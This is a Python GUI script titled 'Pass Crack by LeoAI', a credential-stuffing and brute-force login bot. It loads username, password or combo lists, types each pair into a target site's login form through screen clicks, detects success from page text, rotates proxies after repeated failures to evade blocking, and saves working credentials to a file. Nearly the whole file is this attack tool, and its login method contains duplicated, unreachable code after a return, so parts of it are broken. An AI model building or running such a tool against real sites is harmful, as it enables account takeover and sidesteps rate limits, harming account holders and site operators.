import tkinter as tk
from tkinter import filedialog, messagebox
import time
import threading
import keyboard
import os
import logging
import json
import pyautogui
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

# Setup logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

class LoginBot:
    def __init__(self, root):
        logging.debug("Initializing LoginBot UI")
        self.root = root
        self.root.title("Pass Crack by LeoAI")

        self.username_file_path = ""
        self.password_file_path = ""
        self.combo_file_path = ""
        self.proxy_file_path = ""
        self.max_proxy_attempts = 3
        self.current_proxy_attempts = 0
        self.proxies = []
        self.current_proxy_index = 0

        self.green_dot_position = (100, 100)
        self.red_dot_position = (200, 200)
        self.blue_dot_position = (300, 300)

        self.screen_width = self.root.winfo_screenwidth()
        self.screen_height = self.root.winfo_screenheight()

        self.progress_file = "progress.txt"
        self.driver = None

        self.load_dot_positions()
        self.load_progress()

        self.create_ui()

        self.bot_running = False
        keyboard.add_hotkey('up', self.toggle_login_process)

    def create_ui(self):
        logging.debug("Creating UI")
        self.root.config(bg='#2f3136')

        tk.Button(self.root, text="Open Browser", command=self.launch_browser, bg="#43b581", fg="white").pack(pady=10)
        tk.Label(self.root, text="Use this for the dots", fg="white", bg="#2f3136").pack()

        tk.Label(self.root, text="Login Bot", font=("Arial", 14, "bold"), fg="white", bg="#2f3136").pack(pady=10)
        tk.Button(self.root, text="Select Usernames", command=self.select_username_file, bg="#7289da", fg="white").pack(pady=5)
        tk.Button(self.root, text="Select Passwords", command=self.select_password_file, bg="#7289da", fg="white").pack(pady=5)
        tk.Button(self.root, text="Select User:Pass Combo", command=self.select_combo_file, bg="#7289da", fg="white").pack(pady=5)

        self.username_label = tk.Label(self.root, text="No username file selected", fg="white", bg="#2f3136")
        self.username_label.pack()

        self.password_label = tk.Label(self.root, text="No password file selected", fg="white", bg="#2f3136")
        self.password_label.pack()

        self.combo_label = tk.Label(self.root, text="No combo file selected", fg="white", bg="#2f3136")
        self.combo_label.pack()

        tk.Button(self.root, text="Set Dots", command=self.show_dot_overlay, bg="#7289da", fg="white").pack(pady=5)

        tk.Label(self.root, text="Login Speed (milliseconds)", fg="white", bg="#2f3136").pack(pady=5)
        self.speed_entry = tk.Entry(self.root, width=10)
        self.speed_entry.insert(0, "1000")
        self.speed_entry.pack(pady=5)

        tk.Button(self.root, text="Select Proxy List", command=self.select_proxy_file, bg="#7289da", fg="white").pack(pady=5)
        self.proxy_label = tk.Label(self.root, text="No proxy list selected", fg="white", bg="#2f3136")
        self.proxy_label.pack()

        tk.Label(self.root, text="Proxy attempts before switch", fg="white", bg="#2f3136").pack(pady=5)
        self.proxy_attempts_entry = tk.Entry(self.root, width=10)
        self.proxy_attempts_entry.insert(0, str(self.max_proxy_attempts))
        self.proxy_attempts_entry.pack(pady=5)
        
        tk.Label(self.root, text="Success indicator (HTML element/text)", fg="white", bg="#2f3136").pack(pady=5)
        self.success_indicator_entry = tk.Entry(self.root, width=30)
        self.success_indicator_entry.insert(0, "logout")  # Default text to look for
        self.success_indicator_entry.pack(pady=5)

        self.status_label = tk.Label(self.root, text="Ready", font=("Arial", 10), fg="white", bg="#2f3136")
        self.status_label.pack(pady=5)

        self.toggle_label = tk.Label(self.root, text="Press up arrow to toggle", font=("Arial", 12, "bold"), fg="white", bg="#2f3136")
        self.toggle_label.pack(pady=20)

    def show_dot_overlay(self):
        overlay = tk.Toplevel(self.root)
        overlay.overrideredirect(True)
        overlay.geometry(f"{self.screen_width}x{self.screen_height}+0+0")
        overlay.attributes("-topmost", True)
        overlay.wm_attributes("-transparentcolor", "white")

        canvas = tk.Canvas(overlay, bg="white", highlightthickness=0)
        canvas.pack(fill="both", expand=True)

        drag_data = {"item": None, "x": 0, "y": 0}

        def on_start_drag(event):
            item = canvas.find_closest(event.x, event.y)[0]
            drag_data["item"] = item
            drag_data["x"] = event.x
            drag_data["y"] = event.y

        def on_drag(event):
            dx = event.x - drag_data["x"]
            dy = event.y - drag_data["y"]
            canvas.move(drag_data["item"], dx, dy)
            drag_data["x"] = event.x
            drag_data["y"] = event.y

            coords = canvas.coords(drag_data["item"])
            cx = (coords[0] + coords[2]) // 2
            cy = (coords[1] + coords[3]) // 2

            tag = canvas.gettags(drag_data["item"])[0]
            if tag == "green":
                self.green_dot_position = (cx, cy)
            elif tag == "red":
                self.red_dot_position = (cx, cy)
            elif tag == "blue":
                self.blue_dot_position = (cx, cy)

        def create_dot(x, y, color, tag):
            dot = canvas.create_oval(x - 15, y - 15, x + 15, y + 15, fill=color, outline="", tags=tag)
            canvas.tag_bind(dot, "<ButtonPress-1>", on_start_drag)
            canvas.tag_bind(dot, "<B1-Motion>", on_drag)

        create_dot(*self.green_dot_position, "green", "green")
        create_dot(*self.red_dot_position, "red", "red")
        create_dot(*self.blue_dot_position, "blue", "blue")

        def on_close():
            self.save_dot_positions()
            overlay.destroy()

        exit_button = tk.Button(overlay, text="Save & Close", command=on_close, bg="#7289da", fg="white")
        exit_button.place(x=10, y=10)

    def select_username_file(self):
        self.username_file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if self.username_file_path:
            self.combo_file_path = ""
            self.combo_label.config(text="Combo input disabled (using username/password)")
            self.username_label.config(text=f"Username file: {os.path.basename(self.username_file_path)}")

    def select_password_file(self):
        self.password_file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if self.password_file_path:
            self.combo_file_path = ""
            self.combo_label.config(text="Combo input disabled (using username/password)")
            self.password_label.config(text=f"Password file: {os.path.basename(self.password_file_path)}")

    def select_combo_file(self):
        self.combo_file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if self.combo_file_path:
            self.username_file_path = ""
            self.password_file_path = ""
            self.username_label.config(text="Username input disabled (using combo)")
            self.password_label.config(text="Password input disabled (using combo)")
            self.combo_label.config(text=f"Combo file: {os.path.basename(self.combo_file_path)}")

    def select_proxy_file(self):
        self.proxy_file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if self.proxy_file_path:
            self.proxy_label.config(text=f"Proxy list file: {os.path.basename(self.proxy_file_path)}")
            self.load_proxies()
    
    def load_proxies(self):
        if not os.path.exists(self.proxy_file_path):
            return
        
        with open(self.proxy_file_path, 'r') as f:
            self.proxies = [line.strip() for line in f if line.strip()]
            self.current_proxy_index = 0
            logging.debug(f"Loaded {len(self.proxies)} proxies")

    def toggle_login_process(self):
        if self.bot_running:
            self.bot_running = False
            self.status_label.config(text="Stopped")
            logging.info("Bot stopped")
        else:
            # Validate required files are selected
            if self.combo_file_path == "" and (self.username_file_path == "" or self.password_file_path == ""):
                messagebox.showerror("Error", "You must select either a combo file or both username and password files")
                return
                
            # Make sure browser is open
            if self.driver is None:
                messagebox.showerror("Error", "You must open the browser first")
                return
                
            self.bot_running = True
            self.status_label.config(text="Running")
            logging.info("Bot started")
            threading.Thread(target=self.login_loop, daemon=True).start()

    def launch_browser(self):
        try:
            options = Options()
            options.add_argument("--start-maximized")

            if self.proxies and len(self.proxies) > 0:
                proxy = self.proxies[self.current_proxy_index]
                logging.debug(f"Using proxy: {proxy}")
                options.add_argument(f"--proxy-server={proxy}")

            self.driver = webdriver.Chrome(options=options)
            self.driver.get("https://example.com")  # Change to your target site
            logging.info("Browser launched")
            messagebox.showinfo("Success", "Browser launched successfully")
        except Exception as e:
            logging.error(f"Failed to launch browser: {e}")
            messagebox.showerror("Error", f"Failed to launch browser: {e}")

    def change_proxy(self):
        if not self.proxies:
            return False
            
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        new_proxy = self.proxies[self.current_proxy_index]
        logging.info(f"Switching to proxy: {new_proxy}")
        
        # Restart the browser with new proxy
        if self.driver:
            self.driver.quit()
            
        options = Options()
        options.add_argument("--start-maximized")
        options.add_argument(f"--proxy-server={new_proxy}")
        
        try:
            self.driver = webdriver.Chrome(options=options)
            self.driver.get("https://example.com")  # Change to your target site
            return True
        except Exception as e:
            logging.error(f"Failed to switch proxy: {e}")
            return False

    def login_loop(self):
        try:
            # Get login speed
            try:
                login_speed = int(self.speed_entry.get())
            except ValueError:
                login_speed = 1000
                
            # Get proxy attempts
            try:
                self.max_proxy_attempts = int(self.proxy_attempts_entry.get())
            except ValueError:
                self.max_proxy_attempts = 3

            usernames = []
            passwords = []
            combos = []
            
            # Load credentials based on selected files
            if self.combo_file_path:
                with open(self.combo_file_path, 'r') as f:
                    combos = [line.strip() for line in f if line.strip()]
                start_index = self.progress["combo"]
            else:
                with open(self.username_file_path, 'r') as f:
                    usernames = [line.strip() for line in f if line.strip()]
                with open(self.password_file_path, 'r') as f:
                    passwords = [line.strip() for line in f if line.strip()]
                user_index = self.progress["user"]
                pass_index = self.progress["pass"]
            
            # Main login loop
            while self.bot_running:
                if self.combo_file_path:
                    # Using combo file
                    if start_index >= len(combos):
                        messagebox.showinfo("Complete", "All combinations tried")
                        self.bot_running = False
                        self.status_label.config(text="Completed")
                        break
                        
                    combo = combos[start_index]
                    if ":" in combo:
                        username, password = combo.split(":", 1)
                        logging.info(f"Trying combo {start_index+1}/{len(combos)}: {username}:****")
                        success = self.try_login(username, password)
                        
                        # Save progress
                        self.progress["combo"] = start_index
                        self.save_progress()
                        
                        if success:
                            self.status_label.config(text=f"Success! {username}:{password}")
                            with open("success.txt", "a") as f:
                                f.write(f"{username}:{password}\n")
                            messagebox.showinfo("Success", f"Login successful with {username}:{password}")
                            self.bot_running = False
                            break
                        
                        start_index += 1
                    else:
                        # Invalid combo format, skip
                        start_index += 1
                        continue
                else:
                    # Using separate username and password files
                    if user_index >= len(usernames):
                        messagebox.showinfo("Complete", "All combinations tried")
                        self.bot_running = False
                        self.status_label.config(text="Completed")
                        break
                        
                    username = usernames[user_index]
                    password = passwords[pass_index]
                    
                    logging.info(f"Trying U:{user_index+1}/{len(usernames)} P:{pass_index+1}/{len(passwords)}: {username}:****")
                    success = self.try_login(username, password)
                    
                    # Save progress
                    self.progress["user"] = user_index
                    self.progress["pass"] = pass_index
                    self.save_progress()
                    
                    if success:
                        self.status_label.config(text=f"Success! {username}:{password}")
                        with open("success.txt", "a") as f:
                            f.write(f"{username}:{password}\n")
                        messagebox.showinfo("Success", f"Login successful with {username}:{password}")
                        self.bot_running = False
                        break
                    
                    # Move to next credential
                    pass_index += 1
                    if pass_index >= len(passwords):
                        pass_index = 0
                        user_index += 1
                
                # Apply the full login speed delay between attempts
                # This ensures we respect the user's desired speed setting
                try:
                    login_speed_ms = int(self.speed_entry.get())
                    login_speed_sec = login_speed_ms / 1000
                    time.sleep(login_speed_sec)
                except ValueError:
                    time.sleep(1.0)  # Default to 1 second if invalid entry
                
        except Exception as e:
            logging.error(f"Error in login loop: {e}")
            self.bot_running = False
            self.status_label.config(text="Error")
            messagebox.showerror("Error", f"Login loop error: {e}")

    def try_login(self, username, password):
        try:
            # Update status display
            self.status_label.config(text=f"Trying: {username}")
            self.root.update()
            
            # Get login speed in seconds
            try:
                login_speed_ms = int(self.speed_entry.get())
                login_speed_sec = login_speed_ms / 1000
            except ValueError:
                login_speed_sec = 1.0
            
            # Click on username field (green dot)
            # Click just to the right of the dot to hit the actual browser field
            x, y = self.green_dot_position
            pyautogui.click(x + 30, y)  # Offset to click in the actual field
            pyautogui.hotkey('ctrl', 'a')  # Select all existing text
            pyautogui.press('delete')  # Clear field
            pyautogui.typewrite(username)
            time.sleep(login_speed_sec * 0.2)  # Brief pause after typing
            
            # Click on password field (red dot)
            x, y = self.red_dot_position
            pyautogui.click(x + 30, y)  # Offset to click in the actual field
            pyautogui.hotkey('ctrl', 'a')  # Select all existing text
            pyautogui.press('delete')  # Clear field
            pyautogui.typewrite(password)
            time.sleep(login_speed_sec * 0.2)  # Brief pause after typing
            
            # Click login button (blue dot)
            x, y = self.blue_dot_position
            pyautogui.click(x + 30, y)  # Also use offset for the button
            
            # Wait for login processing based on configured speed
            time.sleep(login_speed_sec * 0.6)  # Use 60% of specified delay for processing
            
            # Get success indicator text from UI
            success_indicator = self.success_indicator_entry.get().strip()
            
            # Check if login was successful by looking for the success indicator in page source
            if success_indicator and success_indicator in self.driver.page_source:
                # Found the success indicator in the page
                success = True
                logging.info(f"Login successful with {username}:{password}")
                # Record the successful login
                with open("success.txt", "a") as f:
                    f.write(f"{username}:{password}\n")
                self.status_label.config(text=f"Success! {username}:{password}")
            else:
                success = False
                
            if not success:
                self.current_proxy_attempts += 1
                if self.current_proxy_attempts >= self.max_proxy_attempts:
                    # Switch proxy after max attempts
                    self.current_proxy_attempts = 0
                    self.change_proxy()
            
            return success
            
        except Exception as e:
            logging.error(f"Error during login attempt: {e}")
            self.current_proxy_attempts += 1
            if self.current_proxy_attempts >= self.max_proxy_attempts:
                # Switch proxy after max attempts
                self.current_proxy_attempts = 0
                self.change_proxy()
            return False
            
            # Here you would add code to check if login was successful
            # This is a simplistic implementation
            
            # Example: check for a specific element that appears only on successful login
            # Or check for error messages
            success = False  # Replace with actual success detection
            
            # For demo purposes, just check if we're at a different URL
            current_url = self.driver.current_url
            if "example.com" not in current_url:
                # URL changed, might indicate successful login
                success = True
            
            if not success:
                self.current_proxy_attempts += 1
                if self.current_proxy_attempts >= self.max_proxy_attempts:
                    # Switch proxy after max attempts
                    self.current_proxy_attempts = 0
                    self.change_proxy()
            
            return success
            
        except Exception as e:
            logging.error(f"Error during login attempt: {e}")
            self.current_proxy_attempts += 1
            if self.current_proxy_attempts >= self.max_proxy_attempts:
                # Switch proxy after max attempts
                self.current_proxy_attempts = 0
                self.change_proxy()
            return False

    def save_dot_positions(self):
        with open("dot_positions.json", "w") as f:
            json.dump({
                "green": self.green_dot_position,
                "red": self.red_dot_position,
                "blue": self.blue_dot_position
            }, f)
        logging.debug("Dot positions saved")

    def load_dot_positions(self):
        if os.path.exists("dot_positions.json"):
            try:
                with open("dot_positions.json", "r") as f:
                    data = json.load(f)
                    self.green_dot_position = tuple(data.get("green", self.green_dot_position))
                    self.red_dot_position = tuple(data.get("red", self.red_dot_position))
                    self.blue_dot_position = tuple(data.get("blue", self.blue_dot_position))
                logging.debug("Dot positions loaded")
            except Exception as e:
                logging.warning(f"Failed to load dot positions: {e}")

    def load_progress(self):
        self.progress = {"user": 0, "pass": 0, "combo": 0}
        if os.path.exists("saveU.txt"):
            try:
                with open("saveU.txt", "r") as f:
                    self.progress["user"] = int(f.read().strip())
            except:
                pass
        if os.path.exists("saveP.txt"):
            try:
                with open("saveP.txt", "r") as f:
                    self.progress["pass"] = int(f.read().strip())
            except:
                pass
        if os.path.exists("saveUP.txt"):
            try:
                with open("saveUP.txt", "r") as f:
                    self.progress["combo"] = int(f.read().strip())
            except:
                pass
        logging.debug(f"Progress loaded: {self.progress}")

    def save_progress(self):
        if self.combo_file_path:
            with open("saveUP.txt", "w") as f:
                f.write(str(self.progress["combo"]))
        else:
            with open("saveU.txt", "w") as f:
                f.write(str(self.progress["user"]))
            with open("saveP.txt", "w") as f:
                f.write(str(self.progress["pass"]))
        logging.debug("Progress saved")

if __name__ == "__main__":
    logging.debug("Starting main application")
    root = tk.Tk()
    root.geometry("400x600")
    app = LoginBot(root)
    root.mainloop()